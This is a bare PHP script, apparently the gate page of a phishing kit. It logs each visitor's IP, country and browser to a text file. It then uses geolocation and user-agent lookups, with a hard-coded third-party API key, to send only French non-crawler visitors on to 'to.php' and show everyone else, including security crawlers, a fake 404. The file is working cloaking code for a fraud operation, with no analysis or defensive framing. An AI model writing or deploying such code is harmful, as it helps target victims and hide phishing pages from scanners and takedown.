<?php
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s");
 $PP = getenv("REMOTE_ADDR");
 $J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ;
$ip = getenv("REMOTE_ADDR");
$file = fopen("visit.txt","a");
fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ." ". $_SERVER['HTTP_USER_AGENT'] ."\n") ;
$ip = $_SERVER['REMOTE_ADDR'];

$jib = json_decode(file_get_contents("http://ip-api.com/json/".$ip));

$blad = $jib->country;

if ($blad == "France") {

$url = file_get_contents("http://api.userstack.com/api/detect?access_key=657ccc84588ca50f125528dee37105a6&ua=".urlencode($_SERVER['HTTP_USER_AGENT']));

$info = json_decode($url);
if ("crawler" == $info->type) {

header("HTTP/1.0 404 Not Found");
exit;
	
} else {
header('Location: to.php');

}
} else {
header("HTTP/1.0 404 Not Found");
exit;
}


?>